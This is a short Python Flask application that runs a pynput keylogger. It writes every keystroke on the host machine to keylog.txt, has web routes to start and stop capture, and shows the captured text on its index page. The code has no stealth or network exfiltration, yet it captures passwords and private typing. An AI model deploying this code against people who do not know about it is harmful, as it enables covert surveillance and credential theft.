import os
from flask import Flask, render_template, request, redirect, url_for
from pynput import keyboard

app = Flask(__name__)

LOG_FILE = "keylog.txt"
listener = None

def on_press(key):
    with open(LOG_FILE, 'a') as f:
        try:
            f.write(f'{key.char}\n')
        except AttributeError:
            f.write(f'{key}\n')

@app.route('/')
def index():
    global listener
    log_content = ''
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            log_content = f.read()
    return render_template('index.html', logging=listener is not None, log_content=log_content)

@app.route('/start_logging', methods=['POST'])
def start_logging():
    global listener
    if listener is None:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    return redirect(url_for('index'))

@app.route('/stop_logging', methods=['POST'])
def stop_logging():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
